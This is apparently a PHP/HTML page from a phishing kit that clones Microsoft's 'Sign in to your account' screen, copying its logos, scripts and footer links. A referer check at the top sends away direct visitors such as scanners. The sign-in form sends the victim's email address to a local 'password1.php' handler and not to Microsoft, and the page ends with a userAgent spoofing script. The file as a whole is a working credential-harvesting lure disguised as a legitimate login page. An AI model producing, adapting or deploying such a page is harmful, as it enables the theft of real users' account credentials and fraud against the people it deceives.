<?php
session_start();
if(empty($_SERVER['HTTP_REFERER']))
{
header("location: ../../");
exit;
} 
?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

        <noscript>
            <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/common/jsdisabled" />
        </noscript>
        <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/favicon_a.ico">
    

<script type="text/javascript">//<![CDATA[
!function(){var e=window,r=e.$Debug=e.$Debug||{},n=e.$Config||{};if(!r.appendLog){var t=[],o=0;r.appendLog=function(e){var r=n.maxDebugLog||25,a=(new Date).toUTCString()+":"+e;t.push(o+":"+a),t.length>r&&t.shift(),o++},r.getLogs=function(){return t}}}(),function(){function e(e,r){function n(a){var i=e[a];return t-1>a?void(o.r[i]?n(a+1):o.when(i,function(){n(a+1)})):void r(i)}var t=e.length;n(0)}function r(e,r,a){function i(){var e=!!s.method,o=e?s.method:a[0],i=s.extraArgs||[],u=t.$WebWatson;try{var l=n(a,!e);if(i&&i.length>0)for(var c=i.length,d=0;c>d;d++)l.push(i[d]);o.apply(r,l)}catch(f){return void(u&&u.submitFromException&&u.submitFromException(f))}}var s=o.r&&o.r[e];return r=r?r:this,s&&(s.skipTimeout?i():t.setTimeout(i,0)),s}function n(e,r){return Array.prototype.slice.call(e,r?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var o=t.$Do;o.when=function(n,t){function a(e){r(e,i,s)||o.q.push({id:e,c:i,a:s})}var i=0,s=[],u=1,l="function"==typeof t;l||(i=t,u=2);for(var c=u;c<arguments.length;c++)s.push(arguments[c]);n instanceof Array?e(n,a):a(n)},o.register=function(e,n,t){if(!o.r[e]){o.o.push(e);var a={};if(n&&(a.method=n),t&&(a.skipTimeout=t),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}o.r[e]=a,o.lock++;try{for(var s=0;s<o.q.length;s++){var u=o.q[s];u.id==e&&r(e,u.c,u.a)&&o.removeItems.push(u)}}catch(l){throw l}finally{if(o.lock--,0===o.lock){for(var c=0;c<o.removeItems.length;c++)for(var d=o.removeItems[c],f=0;f<o.q.length;f++)if(o.q[f]===d){o.q.splice(f,1);break}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(){function e(e){d&&d.appendLog&&d.appendLog(e)}function r(e){return e.length>p.length&&e.substr(e.length-p.length).toLowerCase()==p}function n(n,o,a,i,s,u,l){var c=n.src||n.href||"";if(c){var d=n.id||"";if(!o&&r(c))try{n.sheet&&n.sheet.cssRules&&!n.sheet.cssRules.length&&(o=!0)}catch(f){}o?(e("[$Loader]: "+(l||"Failed")+" '"+(c||"")+"', id:"+d+", async:"+(n.async||"")+"', defer:"+(n.defer||"")),t(c,0,d,a,i,s)):(e("[$Loader]: "+(u||"Loaded")+" '"+(c||"")+"', id:"+(n.id||"")+", async:"+(n.async||"")+"', defer:"+(n.defer||"")),i&&i())}}function t(e,r,n,o,a,i){if(e)if(o&&h>r){g++;var s=new u;s.retryOnError=!1,s.failMessage="Reload Failed",s.successMessage="Reload Success",s.Add(e,"Reload_"+g+(n?"_"+n:"")),s.Load(a,function(){t(e,r+1,n,o,a,i)})}else i&&i()}function o(e){var r=f.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e.srcPath,r}function a(e){var r=f.createElement("script");return e.id&&(r.id=e.id),r.crossorigin="anonymous",r.type="text/javascript",r.src=e.srcPath,r.defer=!1,r.async=!1,r}function i(t,i,s,u,l,c){function d(){n(g,!1,i,s,u,l,c)}if(!t||!t.srcPath)return void(s&&s());var g=null;g=r(t.srcPath)?o(t):a(t),g.onload=d,g.onerror=function(){n(g,!0,i,s,u,l,c)},g.onreadystatechange=function(){"loaded"===g.readyState?setTimeout(d,500):"complete"===g.readyState&&d()};var h=f.getElementsByTagName("head")[0];h.appendChild(g),e("[$Loader]: Loading '"+(t.srcPath||"")+"', id:"+(t.id||""))}function s(e,r,n,t,o,a,u){function l(){s(e,r+1,n,t,o,a,u)}return r<e.length?void i(e[r],n,l,o,a,u):void(t&&t())}function u(){var e=this,r=[];e.retryOnError=!0,e.successMessage="Loaded",e.failMessage="Error",e.Add=function(e,n){e&&r.push({srcPath:e,id:n})},e.AddIf=function(r,n,t){r&&e.Add(n,t)},e.Load=function(n,t){s(r,0,e.retryOnError,n,t,e.successMessage,e.failMessage)}}var l=window,c=l.$Config,d=l.$Debug,f=l.document,g=0,h=c.slMaxRetry||2,v=c.slReportFailure||!1,p=".css";u.On=function(e,r){if(!e)throw"The target element must be provided and cannot be null";n(e,r,!0,null,function(){if(v){var r=e.src||e.href||"";throw"Failed to load external resource ['"+r+"']"}})},l.$Loader=u}(),function(){function e(){if(!m){var e=new f.$Loader;e.AddIf(!f.jQuery,h.sbundle,"WebWatson_DemandSupport"),h.sbundle=null,delete h.sbundle,e.AddIf(!f.$Api,h.fbundle,"WebWatson_DemandFramework"),h.fbundle=null,delete h.fbundle,e.Add(h.bundle,"WebWatson_DemandLoaded"),e.Load(r,n),m=!0}}function r(){if(f.$WebWatson){if(f.$WebWatson.isProxy)return void n();v.when("$WebWatson.full",function(){for(;p.length>0;){var e=p.shift();e&&f.$WebWatson[e.cmdName].apply(f.$WebWatson,e.args)}})}}function n(){var e=f.$WebWatson?f.$WebWatson.isProxy:!0;if(e){if(!b&&JSON){try{var r=new XMLHttpRequest;r.open("POST",h.url),r.setRequestHeader("Accept","application/json"),r.setRequestHeader("Content-Type","application/json; charset=UTF-8"),r.setRequestHeader("canary",g.apiCanary),r.setRequestHeader("client-request-id",g.correlationId),r.setRequestHeader("hpgid",g.hpgid||0),r.setRequestHeader("hpgact",g.hpgact||0);for(var n=-1,o=0;o<p.length;o++)if("submit"===p[o].cmdName){n=o;break}var a=p[n]?p[n].args||[]:[],i={sr:h.sr,ec:"Failed to load external resource [Core Watson files]",wec:55,idx:1,pn:g.pgid||"",sc:g.scid||0,hpg:g.hpgid||0,msg:"Failed to load external resource [Core Watson files]",url:a[1]||"",ln:0,ad:0,an:!1,cs:"",sd:g.serverDetails,ls:null,diag:null};r.send(JSON.stringify(i))}catch(s){}b=!0}h.loadErrorUrl&&window.location.assign(h.loadErrorUrl)}t()}function t(){p=[],f.$WebWatson=null}function o(r){return function(){var n=arguments;p.push({cmdName:r,args:n}),e()}}function a(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var n=e.length,t=0;n>t;t++){var a=e[t];a&&(r[a]=o(a))}}function i(e,r,n,t,o,a,i){var s=f.event;a||(a=d(o||s,i?i+2:2)),f.$Debug&&f.$Debug.appendLog&&f.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(n||"??")),w.submit(e,r,n,t,o||s,a,i)}function s(e,r){return{signature:e,args:r,toString:function(){return this.signature}}}function u(e){for(var r=[],n=e.split("\n"),t=0;t<n.length;t++)r.push(s(n[t],[]));return r}function l(e){for(var r=[],n=e.split("\n"),t=0;t<n.length;t++){var o=s(n[t],[]);n[t+1]&&(o.signature+="@"+n[t+1],t++),r.push(o)}return r}function c(e){if(!e)return null;try{if(e.stack)return u(e.stack);if(e.error){if(e.error.stack)return u(e.error.stack)}else if(window.opera&&e.message)return l(e.message)}catch(r){}return null}function d(e,r){var n=[];try{for(var t=arguments.callee;r>0;)t=t?t.caller:t,r--;for(var o=0;t&&y>o;){var a="InvalidMethod()";try{a=t.toString()}catch(i){}var u=[],l=t.args||t.arguments;if(l)for(var d=0;d<l.length;d++)u[d]=l[d];n.push(s(a,u)),t=t.caller,o++}}catch(i){n.push(s(i.toString(),[]))}var f=c(e);return f&&(n.push(s("--- Error Event Stack -----------------",[])),n=n.concat(f)),n}var f=window,g=f.$Config||{},h=g.watson,v=f.$Do;if(!f.$WebWatson&&h){var p=[],m=!1,b=!1,y=10,w=f.$WebWatson=new a;w.CB={},w._orgErrorHandler=f.onerror,f.onerror=i,w.errorHooked=!0,v.when("jQuery.version",function(e){h.expectedVersion=e}),v.register("$WebWatson")}}(),function(){function e(e,r){for(var n=r.split("."),t=n.length,o=0;t>o&&null!==e&&void 0!==e;)e=e[n[o++]];return e}function r(r){var n=null;return null===u&&(u=e(a,"Constants")),null!==u&&r&&(n=e(u,r)),null===n||void 0===n?"":n.toString()}function n(n){var t=null;return null===i&&(i=e(a,"$Config.strings")),null!==i&&n&&(t=e(i,n.toLowerCase())),(null===t||void 0===t)&&(t=r(n)),null===t||void 0===t?"":t.toString()}function t(e,r){var t=null;return e&&r&&r[e]&&(t=n("errors."+r[e])),t||(t=n("errors."+e)),t||(t=n("errors."+l)),t||(t=n(l)),t}function o(n){var t=null;return null===s&&(s=e(a,"$Config.urls")),null!==s&&n&&(t=e(s,n.toLowerCase())),(null===t||void 0===t)&&(t=r(n)),null===t||void 0===t?"":t.toString()}var a=window,i=null,s=null,u=null,l="GENERIC_ERROR";a.GetString=n,a.GetErrorString=t,a.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}();

//]]></script> 



    <script type="text/javascript">
        ServerData = $Config;
    </script>

    
    <link href="../empty_files/converged.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">

    <script crossorigin="anonymous" src="../empty_files/convergedlogin_pcore.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>


    <script crossorigin="anonymous" src="../empty_files/convergedloginpaginatedstrings-en.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    


<style type="text/css">.zombocam * {
  box-sizing: border-box;
  font-family: sans-serif;
}

</style></head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var o=window,l=o.document,n=o.$Config||{};o.self===o.top?l&&l.body&&(l.body.style.display="block"):n.allowFrame||(o.top.location=o.self.location)}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="password1.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="../empty_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['WF_STR_HeaderDefault_Title']">Sign in</div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': usernameTextbox.error },
                    attr: inputAttributes" placeholder="someone@example.com " aria-label="Enter your email address" type="email" lang="en"> <input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" style="display: none;" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div class="row"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }"> <div data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display: none;" type="button"> </div> <div data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-24"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next" type="submit"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                params: {
                    availableCreds: availableCredsWithoutUsername },
                event: {
                    switchView: noUsernameCredSwitchLink_onSwitchView } } --><!-- ko if: altCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" href="#" data-bind="text: str['WF_STR_CantAccessAccount_Text'], click: cantAccessAccount_onClick">Can’t access your account?</a> </div><!-- /ko --> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="YUaWeW7uJ39Lczr+KeYBy4+h8qq3G6TwDhYuf+xNJMo=5:1" type="hidden"> <input name="ctx" data-bind="value: ctx" value="rQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6Bd39rBRZmnnFpdAv56p15qnYVo1JGSUlBsZW-fn5pSU5-frZeflpaZnKqsZmpXnJ-rn5-eaL-DkbGC4yMq5jMzYzNjCzNLY0tLQwNzc1NTA3N9FIsTIxSUk1NdI2STY11TYyAFlskm5noppqbWpgZGVokJhoa32Li93csLckwAhH5RZlVqZ-YONPyi3LjC_KLS2Yxs4JtWcVMlC82MbMB3ZWbn3eKmS2_IDUvM-UCC-MrFh4DZisODjYBRgkGBYYfLIyLWIG-tWNhYAz67ui80fXgoYXWDAynWPUjQxPDU8PNS72MLX2Sq4q0vVMjnSpNtDMsCguN3c1Cyl0yIkvTtCv8vHzzbU2tDCewMU5gY_vAxrCLk4iAAgA1" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAABHh4kmS_aKT5XrjzxRAtHzW_7XYj4n97fBgYpBVkMF2u8DEoFG1NLTH4wGJsHcqWd961rzonVzPgPWlurELCD1Jr0yER0D6RdD_0tANgbW2s941hyUNVKiKzShTxsqpRH_ke9-kYFlx2iFl7PSTMb8q3KVLIhvcxARbBtdYCGt_5ab6QgovQlVlfDvIVgzjYJ47HD49Zjx-ihY0mCi6I70t4MNdazREXiLINlbRXPLZtL-BMbtKcT2-hls8De5i2OwmlMIWtSCFNd5wbiDqmNHMFZfUOIR9T5im3mXBHl86uT9YOcrpG1Iqr-2Q1-m-rbCh0K2Fqrha2bv6V4yQx1PIAA" type="hidden"> <input name="PPSX" data-bind="value: svr.sRandomBlob" value="" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="" type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2020 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="../empty_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7230.14/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="../empty_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="../empty_files/prefetch.htm" width="0" height="0"></iframe></div> <!-- /ko --></div></body><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"})</script></html>